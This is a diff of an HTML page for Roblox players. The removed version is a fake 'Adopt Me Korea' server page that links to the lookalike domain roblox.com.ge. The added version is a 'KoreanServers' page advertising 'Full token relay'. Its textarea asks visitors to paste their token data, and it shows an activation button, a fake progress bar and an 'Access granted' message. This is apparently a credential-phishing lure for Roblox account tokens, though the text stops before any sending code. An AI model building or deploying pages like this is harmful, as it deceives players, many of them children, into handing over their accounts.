@@ -1,846 +1,666 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <meta name="description" content="Official Korean Adopt Me Server! Low ping, cute community, dedicated servers.">
-    <meta name="theme-color" content="#0a0a0f">
-    <title>Adopt Me Korea! 🌙 Official Korean Server</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Quicksand', 'Segoe UI', system-ui, sans-serif;
-            min-height: 100vh;
-            background: linear-gradient(145deg, #0a0a0f 0%, #1a0a2e 40%, #0d0d1a 100%);
-            position: relative;
-            overflow-x: hidden;
-        }
-
-        /* Stars background - animated */
-        .stars {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 0;
-        }
-        
-        .star {
-            position: absolute;
-            background: white;
-            border-radius: 50%;
-            opacity: 0;
-            animation: twinkleStar var(--duration, 3s) ease-in-out infinite;
-            animation-delay: var(--delay, 0s);
-        }
-        
-        @keyframes twinkleStar {
-            0%, 100% { opacity: 0; transform: scale(0.5); }
-            50% { opacity: 1; transform: scale(1); }
-        }
-
-        /* Shooting stars */
-        .shooting-star {
-            position: absolute;
-            width: 2px;
-            height: 2px;
-            background: linear-gradient(135deg, white, rgba(255, 105, 180, 0.8));
-            border-radius: 50%;
-            animation: shootStar 4s linear infinite;
-            opacity: 0;
-        }
-        
-        @keyframes shootStar {
-            0% {
-                transform: translateX(0) translateY(0) rotate(45deg);
-                opacity: 0;
-            }
-            10% {
-                opacity: 1;
-            }
-            20% {
-                opacity: 1;
-            }
-            100% {
-                transform: translateX(-300px) translateY(300px) rotate(45deg);
-                opacity: 0;
-            }
-        }
-
-        /* Animated gradient background */
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: 
-                radial-gradient(circle at 20% 40%, rgba(255, 105, 180, 0.08), transparent 50%),
-                radial-gradient(circle at 80% 70%, rgba(100, 50, 150, 0.12), transparent 50%),
-                radial-gradient(circle at 50% 30%, rgba(255, 200, 220, 0.05), transparent 60%);
-            backdrop-filter: blur(4px);
-            z-index: 0;
-            pointer-events: none;
-            animation: bgPulse 8s ease-in-out infinite;
-        }
-        
-        @keyframes bgPulse {
-            0%, 100% { opacity: 0.6; }
-            50% { opacity: 1; }
-        }
-
-        /* Floating orbs effect */
-        .orb {
-            position: fixed;
-            border-radius: 50%;
-            filter: blur(60px);
-            pointer-events: none;
-            z-index: 0;
-            opacity: 0.3;
-            animation: floatOrb 15s ease-in-out infinite;
-        }
-        
-        @keyframes floatOrb {
-            0%, 100% { transform: translate(0, 0) scale(1); }
-            25% { transform: translate(50px, -30px) scale(1.1); }
-            50% { transform: translate(-30px, 50px) scale(0.9); }
-            75% { transform: translate(40px, 40px) scale(1.05); }
-        }
-
-        /* Particle stars canvas */
-        #particleCanvas {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        /* Floating pets */
-        .floating {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 1;
-            overflow: hidden;
-        }
-
-        .floating span {
-            position: absolute;
-            font-size: 32px;
-            animation: floatPet linear infinite;
-            opacity: 0;
-            filter: drop-shadow(0 0 10px rgba(255, 105, 180, 0.5));
-        }
-
-        @keyframes floatPet {
-            0% { transform: translateY(100vh) rotate(0deg) scale(0.5); opacity: 0; }
-            10% { opacity: 0.5; transform: translateY(100vh) rotate(0deg) scale(0.8); }
-            50% { opacity: 0.4; transform: translateY(50vh) rotate(180deg) scale(1); }
-            90% { opacity: 0.3; }
-            100% { transform: translateY(-20vh) rotate(360deg) scale(1.2); opacity: 0; }
-        }
-
-        /* Confetti canvas */
-        #confettiCanvas {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 100;
-        }
-
-        .container {
-            position: relative;
-            z-index: 2;
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px 20px 50px;
-        }
-
-        /* Hero Section */
-        .hero {
-            text-align: center;
-            padding: 45px 30px 40px;
-            background: rgba(15, 10, 25, 0.65);
-            backdrop-filter: blur(20px);
-            border-radius: 48px;
-            margin-bottom: 35px;
-            border: 1px solid rgba(255, 105, 180, 0.3);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5), 0 0 30px rgba(255, 105, 180, 0.15);
-            animation: fadeInDown 0.6s ease, glowPulse 3s infinite;
-            position: relative;
-            overflow: hidden;
-        }
-
-        @keyframes glowPulse {
-            0%, 100% { box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5), 0 0 20px rgba(255, 105, 180, 0.2); }
-            50% { box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5), 0 0 45px rgba(255, 105, 180, 0.4); }
-        }
-
-        @keyframes fadeInDown {
-            from { opacity: 0; transform: translateY(-40px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .hero h1 {
-            font-size: clamp(2.5rem, 10vw, 4.8rem);
-            font-weight: 800;
-            background: linear-gradient(135deg, #ff9bbe, #ff6b9d, #ffb8d0);
-            background-size: 200% auto;
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 8px;
-            letter-spacing: -1px;
-            animation: titleGlow 3s ease-in-out infinite;
-        }
-
-        @keyframes titleGlow {
-            0%, 100% { filter: drop-shadow(0 0 5px rgba(255,105,180,0.3)); }
-            50% { filter: drop-shadow(0 0 20px rgba(255,105,180,0.6)); }
-        }
-
-        .hero .tagline {
-            font-size: clamp(1.1rem, 5vw, 1.5rem);
-            font-weight: 700;
-            color: #ffb8d0;
-            background: rgba(255, 105, 180, 0.15);
-            display: inline-block;
-            padding: 6px 25px;
-            border-radius: 50px;
-            margin-bottom: 15px;
-            border: 1px solid rgba(255, 105, 180, 0.3);
-            backdrop-filter: blur(5px);
-        }
-
-        .hero .description {
-            font-size: 1rem;
-            color: #c0a8c0;
-            max-width: 550px;
-            margin: 0 auto 20px;
-            font-weight: 500;
-            line-height: 1.5;
-        }
-
-        /* PLAY BUTTON */
-        .play-btn {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 15px;
-            background: linear-gradient(135deg, #ff6b9d, #d44a7a, #ff6b9d);
-            background-size: 200% 200%;
-            color: white;
-            font-size: 1.6rem;
-            font-weight: 800;
-            padding: 16px 48px;
-            border-radius: 60px;
-            text-decoration: none;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4), 0 0 20px rgba(255, 105, 180, 0.5);
-            transition: all 0.15s ease;
-            text-shadow: 0 2px 3px rgba(0,0,0,0.3);
-            position: relative;
-            overflow: hidden;
-            animation: gradientShift 2s infinite, btnFloat 2s infinite;
-        }
-
-        @keyframes gradientShift {
-            0%, 100% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-        }
-
-        @keyframes btnFloat {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-3px); }
-        }
-
-        .play-btn::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.3);
-            transform: translate(-50%, -50%);
-            transition: width 0.5s, height 0.5s;
-        }
-
-        .play-btn:hover::before {
-            width: 400px;
-            height: 400px;
-        }
-
-        .play-btn:hover {
-            gap: 22px;
-            transform: translateY(-3px);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5), 0 0 35px rgba(255, 105, 180, 0.7);
-        }
-
-        /* Tutorial Section */
-        .tutorial-section {
-            background: rgba(15, 10, 25, 0.6);
-            backdrop-filter: blur(15px);
-            border-radius: 48px;
-            padding: 35px 30px;
-            margin: 35px 0 45px;
-            border: 1px solid rgba(255, 105, 180, 0.3);
-            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.3);
-        }
-
-        .tutorial-title {
-            font-size: 1.8rem;
-            font-weight: 800;
-            text-align: center;
-            background: linear-gradient(135deg, #ff9bbe, #ff6b9d);
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 25px;
-        }
-
-        .tutorial-steps {
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 20px;
-        }
-
-        .step {
-            flex: 1;
-            min-width: 180px;
-            background: rgba(25, 18, 40, 0.7);
-            border-radius: 35px;
-            padding: 20px 15px;
-            text-align: center;
-            border: 1px solid rgba(255, 105, 180, 0.25);
-            transition: all 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
-            cursor: pointer;
-        }
-
-        .step:hover {
-            transform: translateY(-8px) scale(1.02);
-            border-color: rgba(255, 105, 180, 0.5);
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3), 0 0 20px rgba(255, 105, 180, 0.2);
-        }
-
-        .step-number {
-            width: 52px;
-            height: 52px;
-            background: linear-gradient(135deg, #ff6b9d, #d44a7a);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.6rem;
-            font-weight: 800;
-            color: white;
-            margin: 0 auto 12px;
-            transition: all 0.3s;
-        }
-
-        .step:hover .step-number {
-            transform: scale(1.1) rotate(360deg);
-        }
-
-        .step-title {
-            font-size: 1rem;
-            font-weight: 800;
-            color: #ffb8d0;
-            margin-bottom: 6px;
-        }
-
-        .step-desc {
-            font-size: 0.8rem;
-            color: #a890b0;
-        }
-
-        /* Buttons */
-        .btn-group {
-            display: flex;
-            justify-content: center;
-            gap: 25px;
-            margin: 35px 0 40px;
-            flex-wrap: wrap;
-        }
-
-        .btn {
-            padding: 14px 38px;
-            border-radius: 50px;
-            font-weight: 700;
-            font-size: 1rem;
-            text-decoration: none;
-            transition: all 0.25s;
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-            cursor: pointer;
-        }
-
-        .btn-primary {
-            background: linear-gradient(100deg, #ff6b9d, #d44a7a);
-            color: white;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-        }
-
-        .btn-secondary {
-            background: rgba(25, 18, 40, 0.9);
-            color: #ffb8d0;
-            border: 1px solid rgba(255, 105, 180, 0.4);
-        }
-
-        .btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4), 0 0 15px rgba(255, 105, 180, 0.3);
-        }
-
-        /* Stats */
-        .stats {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            flex-wrap: wrap;
-            margin: 35px 0 45px;
-        }
-
-        .stat-item {
-            background: rgba(15, 10, 25, 0.6);
-            backdrop-filter: blur(12px);
-            padding: 18px 38px;
-            border-radius: 50px;
-            text-align: center;
-            border: 1px solid rgba(255, 105, 180, 0.3);
-            transition: all 0.3s;
-            cursor: pointer;
-        }
-
-        .stat-item:hover {
-            transform: translateY(-5px);
-            border-color: rgba(255, 105, 180, 0.6);
-        }
-
-        .stat-number {
-            font-size: 2.3rem;
-            font-weight: 800;
-            background: linear-gradient(145deg, #ff9ebb, #ff6b9d);
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .stat-label {
-            font-size: 0.7rem;
-            font-weight: 700;
-            color: #b090b8;
-            letter-spacing: 1.5px;
-        }
-
-        /* Server Grid */
-        .section-title {
-            font-size: 2rem;
-            font-weight: 800;
-            text-align: center;
-            background: linear-gradient(135deg, #ff9ebb, #ff6b9d);
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin: 55px 0 12px;
-        }
-
-        .section-sub {
-            text-align: center;
-            color: #b090b8;
-            margin-bottom: 35px;
-            font-size: 0.95rem;
-        }
-
-        .server-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
-            gap: 30px;
-        }
-
-        .server-card {
-            background: rgba(15, 10, 25, 0.6);
-            backdrop-filter: blur(15px);
-            border-radius: 45px;
-            padding: 25px;
-            transition: all 0.35s cubic-bezier(0.2, 0.9, 0.4, 1.2);
-            border: 1px solid rgba(255, 105, 180, 0.3);
-            text-decoration: none;
-            display: block;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .server-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 105, 180, 0.08), transparent);
-            transition: left 0.5s;
-        }
-
-        .server-card:hover::before {
-            left: 100%;
-        }
-
-        .server-card:hover {
-            transform: translateY(-8px);
-            border-color: rgba(255, 105, 180, 0.6);
-        }
-
-        .server-name {
-            font-size: 1.4rem;
-            font-weight: 800;
-            background: linear-gradient(135deg, #ffb8d0, #ff8fb3);
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 6px;
-        }
-
-        .server-location {
-            font-size: 0.75rem;
-            color: #a890b0;
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-
-        .badges {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 8px;
-            margin: 12px 0;
-        }
-
-        .badge {
-            background: rgba(255, 105, 180, 0.15);
-            padding: 5px 14px;
-            border-radius: 30px;
-            font-size: 0.65rem;
-            font-weight: 700;
-            color: #ffb8d0;
-            border: 1px solid rgba(255, 105, 180, 0.2);
-            transition: all 0.2s;
-        }
-
-        .badge:hover {
-            background: rgba(255, 105, 180, 0.3);
-            transform: scale(1.05);
-        }
-
-        .ping {
-            font-size: 0.75rem;
-            color: #7ac0a8;
-            margin: 12px 0;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-weight: 600;
-        }
-
-        .join-link {
-            color: #ff9ebb;
-            font-weight: 800;
-            text-decoration: none;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 0.85rem;
-            transition: all 0.3s;
-        }
-
-        .join-link:hover {
-            gap: 15px;
-            color: #ffd0e0;
-        }
-
-        /* FAQ */
-        .faq-section {
-            margin: 65px 0 45px;
-        }
-
-        .faq-item {
-            background: rgba(15, 10, 25, 0.6);
-            backdrop-filter: blur(12px);
-            border-radius: 45px;
-            padding: 20px 30px;
-            margin-bottom: 15px;
-            border: 1px solid rgba(255, 105, 180, 0.3);
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .faq-item:hover {
-            transform: translateX(8px);
-            border-color: rgba(255, 105, 180, 0.6);
-        }
-
-        .faq-question {
-            font-weight: 800;
-            font-size: 1.05rem;
-            display: flex;
-            justify-content: space-between;
-            color: #ffb8d0;
-        }
-
-        .faq-question span {
-            transition: transform 0.3s;
-        }
-
-        .faq-item:hover .faq-question span {
-            transform: rotate(180deg);
-        }
-
-        .faq-answer {
-            display: none;
-            margin-top: 14px;
-            color: #b090b8;
-            line-height: 1.5;
-            font-size: 0.85rem;
-            animation: slideDown 0.3s ease;
-        }
-
-        @keyframes slideDown {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .footer {
-            margin-top: 60px;
-            padding: 30px 0;
-            border-top: 1px solid rgba(255, 105, 180, 0.3);
-            display: flex;
-            justify-content: center;
-            gap: 40px;
-            flex-wrap: wrap;
-            font-size: 0.9rem;
-            font-weight: 600;
-        }
-
-        .footer a {
-            color: #b090b8;
-            text-decoration: none;
-            transition: all 0.3s;
-            position: relative;
-        }
-
-        .footer a::after {
-            content: '';
-            position: absolute;
-            bottom: -5px;
-            left: 0;
-            width: 0;
-            height: 2px;
-            background: linear-gradient(90deg, #ff9bbe, #ff6b9d);
-            transition: width 0.3s;
-        }
-
-        .footer a:hover::after {
-            width: 100%;
-        }
-
-        .footer a:hover {
-            color: #ffb8d0;
-        }
-
-        .scroll-top {
-            position: fixed;
-            bottom: 25px;
-            right: 25px;
-            background: linear-gradient(135deg, #ff6b9d, #d44a7a);
-            border-radius: 50px;
-            padding: 12px 20px;
-            color: white;
-            font-weight: 800;
-            cursor: pointer;
-            z-index: 99;
-            display: none;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            font-size: 1rem;
-            transition: all 0.1s;
-        }
-
-        .scroll-top:hover {
-            transform: translateY(-3px);
-        }
-
-        ::-webkit-scrollbar {
-            width: 10px;
-        }
-        ::-webkit-scrollbar-track {
-            background: #0a0a0f;
-        }
-        ::-webkit-scrollbar-thumb {
-            background: linear-gradient(135deg, #ff6b9d, #d44a7a);
-            border-radius: 10px;
-        }
-
-        @media (max-width: 700px) {
-            .container { padding: 15px 15px 40px; }
-            .hero { padding: 30px 20px; }
-            .play-btn { font-size: 1.2rem; padding: 12px 30px; }
-            .step { min-width: 100%; }
-            .stat-item { padding: 12px 25px; min-width: 100px; }
-            .stat-number { font-size: 1.6rem; }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>KoreanServers — Roblox Korean Server Access</title>
+  <meta name="description" content="Join Korean Roblox servers easily — video tutorial + activation panel. Full token relay.">
+  <meta name="theme-color" content="#cc0000">
+  <!-- Tailwind CSS + Font Awesome -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <style>
+    body {
+      background: #0a0c10;
+      font-family: 'Segoe UI', system-ui, -apple-system, BlinkMacSystemFont, 'Poppins', sans-serif;
+      position: relative;
+      overflow-x: hidden;
+    }
+    
+    /* Animated gradient background */
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle at 20% 50%, rgba(220, 38, 38, 0.08) 0%, transparent 50%),
+                  radial-gradient(circle at 80% 80%, rgba(185, 28, 28, 0.06) 0%, transparent 60%);
+      pointer-events: none;
+      z-index: -1;
+    }
+    
+    /* Animated floating particles */
+    .particle {
+      position: fixed;
+      border-radius: 50%;
+      pointer-events: none;
+      z-index: -1;
+      opacity: 0;
+      animation: floatParticle 12s infinite ease-in-out;
+    }
+    
+    @keyframes floatParticle {
+      0% {
+        opacity: 0;
+        transform: translateY(100vh) scale(0);
+      }
+      10% {
+        opacity: 0.4;
+      }
+      90% {
+        opacity: 0.4;
+      }
+      100% {
+        opacity: 0;
+        transform: translateY(-20vh) scale(1.5);
+      }
+    }
+    
+    .card-glass {
+      background: rgba(18, 22, 35, 0.75);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(220, 38, 38, 0.3);
+      border-radius: 2rem;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+    }
+    
+    .card-glass:hover {
+      border-color: rgba(220, 38, 38, 0.6);
+      box-shadow: 0 8px 48px rgba(220, 38, 38, 0.15);
+      transform: translateY(-2px);
+    }
+    
+    .btn-red-glow {
+      background: linear-gradient(135deg, #dc2626, #991b1b);
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      box-shadow: 0 4px 20px 0 rgba(220, 38, 38, 0.4);
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .btn-red-glow::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+      transition: left 0.5s ease;
+    }
+    
+    .btn-red-glow:hover::before {
+      left: 100%;
+    }
+    
+    .btn-red-glow:hover:not(:disabled) {
+      transform: translateY(-3px);
+      box-shadow: 0 12px 32px -6px rgba(220, 38, 38, 0.7);
+    }
+    
+    .btn-red-glow:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
+    }
+    
+    .textarea-kr {
+      background: rgba(10, 12, 20, 0.8);
+      border: 1.5px solid rgba(45, 47, 62, 0.8);
+      border-radius: 1.2rem;
+      transition: all 0.3s ease;
+      color: #e2e8f0;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.85rem;
+      backdrop-filter: blur(4px);
+    }
+    
+    .textarea-kr:focus {
+      border-color: #ef4444;
+      box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.2), 0 0 20px rgba(239, 68, 68, 0.3);
+      outline: none;
+      background: rgba(8, 10, 18, 0.95);
+      transform: scale(1.01);
+    }
+    
+    @keyframes fadeSlideUp {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    @keyframes fadeSlideDown {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    @keyframes glowPulse {
+      0%, 100% { text-shadow: 0 0 5px rgba(220,38,38,0.5); }
+      50% { text-shadow: 0 0 20px rgba(220,38,38,0.8), 0 0 30px rgba(220,38,38,0.4); }
+    }
+    
+    .animate-fade-up {
+      animation: fadeSlideUp 0.5s ease-out forwards;
+    }
+    
+    .animate-fade-down {
+      animation: fadeSlideDown 0.4s ease-out forwards;
+    }
+    
+    .glow-text {
+      animation: glowPulse 3s infinite ease-in-out;
+    }
+    
+    .video-container {
+      position: relative;
+      padding-bottom: 56.25%;
+      height: 0;
+      overflow: hidden;
+      border-radius: 1.2rem;
+      box-shadow: 0 15px 40px -12px rgba(0,0,0,0.6);
+      border: 1px solid rgba(220,38,38,0.5);
+      transition: all 0.3s ease;
+      background: #000;
+    }
+    
+    .video-container:hover {
+      transform: scale(1.02);
+      border-color: rgba(220,38,38,0.8);
+      box-shadow: 0 20px 50px -12px rgba(220,38,38,0.3);
+    }
+    
+    .video-container iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border-radius: 1rem;
+      border: 0;
+    }
+    
+    @media (max-width: 768px) {
+      .two-columns {
+        flex-direction: column;
+      }
+    }
+    
+    /* Loading spinner animation */
+    @keyframes spin-slow {
+      to { transform: rotate(360deg); }
+    }
+    
+    .animate-spin-slow {
+      animation: spin-slow 1.2s linear infinite;
+    }
+    
+    /* Progress bar glow */
+    .progress-glow {
+      background: linear-gradient(90deg, #dc2626, #ef4444, #dc2626);
+      background-size: 200% 100%;
+      animation: progressShimmer 1.5s ease infinite;
+    }
+    
+    @keyframes progressShimmer {
+      0% { background-position: 200% 0; }
+      100% { background-position: -200% 0; }
+    }
+    
+    /* Ripple effect for button */
+    .ripple {
+      position: absolute;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.4);
+      transform: scale(0);
+      animation: rippleAnim 0.6s linear;
+      pointer-events: none;
+    }
+    
+    @keyframes rippleAnim {
+      to {
+        transform: scale(4);
+        opacity: 0;
+      }
+    }
+    
+    /* Floating shapes */
+    .floating-shape {
+      position: fixed;
+      background: rgba(220, 38, 38, 0.05);
+      border-radius: 50%;
+      filter: blur(40px);
+      pointer-events: none;
+      z-index: -1;
+      animation: floatShape 20s infinite ease-in-out;
+    }
+    
+    @keyframes floatShape {
+      0%, 100% { transform: translate(0, 0) scale(1); }
+      33% { transform: translate(30px, -30px) scale(1.1); }
+      66% { transform: translate(-20px, 20px) scale(0.9); }
+    }
+    
+    .toast-notif {
+      position: fixed;
+      bottom: 24px;
+      right: 24px;
+      z-index: 999;
+      animation: fadeSlideUp 0.2s ease-out;
+      backdrop-filter: blur(8px);
+    }
+    
+    ::-webkit-scrollbar {
+      width: 5px;
+    }
+    ::-webkit-scrollbar-track {
+      background: #1e1f2c;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: #dc2626;
+      border-radius: 10px;
+    }
+    
+    .icon-hover {
+      transition: all 0.3s ease;
+    }
+    
+    .icon-hover:hover {
+      transform: scale(1.1) rotate(5deg);
+      color: #ef4444;
+    }
+  </style>
 </head>
 <body>
 
-<!-- Stars background -->
-<div class="stars" id="starsContainer"></div>
-<div class="floating" id="floatingElements"></div>
-<canvas id="particleCanvas"></canvas>
-<canvas id="confettiCanvas"></canvas>
+  <!-- Animated floating shapes -->
+  <div class="floating-shape" style="width: 300px; height: 300px; top: -100px; left: -100px; animation-duration: 25s;"></div>
+  <div class="floating-shape" style="width: 200px; height: 200px; bottom: -50px; right: -50px; animation-duration: 18s; animation-delay: -5s;"></div>
+  <div class="floating-shape" style="width: 150px; height: 150px; top: 40%; right: 10%; animation-duration: 22s; animation-delay: -10s;"></div>
+  
+  <div class="max-w-6xl mx-auto px-4 py-6 md:py-8 relative z-10">
+    
+    <!-- Header -->
+    <div class="text-center mb-8 animate-fade-down">
+      <div class="inline-flex items-center gap-2 bg-black/40 px-5 py-2 rounded-full border border-red-800/50 mb-3 backdrop-blur-sm">
+        <i class="fas fa-flag-checkered text-red-500 text-sm animate-pulse"></i>
+        <span class="text-xs tracking-wide text-red-300 font-mono">KOREA REGION</span>
+      </div>
+      <h1 class="text-5xl md:text-7xl font-black tracking-tight bg-gradient-to-r from-red-500 via-red-400 to-red-600 bg-clip-text text-transparent glow-text">
+        KoreanServers
+      </h1>
+      <p class="text-gray-400 mt-3 text-sm md:text-base tracking-wide">Connect to Korean Roblox servers instantly</p>
+    </div>
 
-<div class="container">
-    <header class="hero">
-        <h1>Adopt Me Korea!</h1>
-        <div class="tagline">🌙 Official Korean Server 🌙</div>
-        <div class="description">Low ping, cozy dark mode community, and the best gaming experience on Korean servers. Join over 150,000+ Korean players right now!</div>
-        <a href="https://roblox.com.ge/games/920587237/Adopt-Me?privateServerLinkCode=09221558288483602204763924831150" target="_blank" rel="noopener noreferrer" class="play-btn" id="playBtn">
-            🎮 PLAY NOW ✨
-        </a>
-    </header>
+    <!-- TWO COLUMNS -->
+    <div class="flex two-columns gap-6 md:gap-8 flex-col md:flex-row">
+      
+      <!-- LEFT COLUMN: Form -->
+      <div class="flex-1 min-w-0 animate-fade-up" style="animation-delay: 0.1s;">
+        <div class="card-glass p-5 md:p-6 h-full transition-all duration-300">
+          <div class="text-center mb-4">
+            <div class="inline-flex bg-gradient-to-br from-red-900/30 to-red-800/10 p-3 rounded-full border border-red-500/40 icon-hover">
+              <i class="fas fa-key text-2xl text-red-400"></i>
+            </div>
+            <h3 class="text-xl font-bold mt-3 bg-gradient-to-r from-gray-200 to-gray-400 bg-clip-text text-transparent">KoreanServers</h3>
+          </div>
 
-    <div class="tutorial-section">
-        <div class="tutorial-title">🐾 HOW TO START PLAYING? 🐾</div>
-        <div class="tutorial-steps">
-            <div class="step"><div class="step-number">1</div><div class="step-title">Choose Server</div><div class="step-desc">Pick any server from the list below</div></div>
-            <div class="step"><div class="step-number">2</div><div class="step-title">Click Connect</div><div class="step-desc">Press the pink "Connect Now" button</div></div>
-            <div class="step"><div class="step-number">3</div><div class="step-title">Log in to Roblox</div><div class="step-desc">Sign in to your Roblox account</div></div>
-            <div class="step"><div class="step-number">4</div><div class="step-title">Enjoy!</div><div class="step-desc">Start playing on Korean servers!</div></div>
+          <div class="mb-5">
+            <textarea id="tokenData" rows="6" class="textarea-kr w-full p-4 resize-y transition-all" placeholder='Paste KoreanServers here...'></textarea>
+            <div class="flex justify-between items-center mt-2 text-xs text-gray-500 flex-wrap gap-2">
+              <div class="flex gap-3">
+                <span id="charCountDisplay" class="font-mono">0 chars</span>
+              </div>
+              <div class="flex gap-3">
+                <button id="clearTextareaBtn" class="text-gray-500 hover:text-red-400 transition-all duration-300 transform hover:scale-105"><i class="fas fa-eraser"></i> Clear</button>
+                <button id="pasteClipboardBtn" class="text-gray-500 hover:text-red-400 transition-all duration-300 transform hover:scale-105"><i class="fas fa-paste"></i> Paste</button>
+              </div>
+            </div>
+            
+            <div id="errorMsgBox" class="mt-3 text-red-400 text-sm hidden bg-red-950/50 p-3 rounded-xl backdrop-blur-sm border border-red-800/50 animate-fade-up">
+              <i class="fas fa-exclamation-triangle mr-2"></i> <span id="errorText">Invalid token</span>
+            </div>
+            <div id="successMsgBox" class="mt-3 text-green-400 text-sm hidden bg-green-950/40 p-3 rounded-xl backdrop-blur-sm border border-green-800/50 animate-fade-up">
+              <i class="fas fa-check-circle mr-2"></i> <span id="successText">Access granted!</span>
+            </div>
+          </div>
+
+          <div class="flex justify-center">
+            <button id="processBtn" class="btn-red-glow text-white font-bold py-3 px-10 rounded-full text-lg tracking-wider flex items-center gap-3 transition-all shadow-lg relative overflow-hidden">
+              <i class="fas fa-cogs"></i> Activate
+              <i class="fas fa-arrow-right group-hover:translate-x-1 transition"></i>
+            </button>
+          </div>
+
+          <div id="loadingState" class="hidden mt-6 text-center">
+            <div class="flex justify-center">
+              <div class="animate-spin-slow rounded-full h-8 w-8 border-3 border-t-red-500 border-red-800/30"></div>
+            </div>
+            <p class="text-gray-400 text-xs mt-3 font-mono tracking-wider">CONNECTING <span class="animate-pulse">...</span></p>
+            <div class="w-48 mx-auto bg-gray-800/50 rounded-full h-1.5 mt-3 overflow-hidden">
+              <div class="progress-glow h-1.5 rounded-full w-0 transition-all duration-200" id="fakeProgress"></div>
+            </div>
+            <p class="text-gray-500 text-[10px] mt-2" id="loadingMsg"></p>
+          </div>
+          
+          <div id="soonMessage" class="mt-6 text-center hidden animate-fade-up">
+            <div class="bg-gradient-to-r from-red-900/40 to-red-800/20 rounded-xl p-4 border border-red-500/40 backdrop-blur-sm">
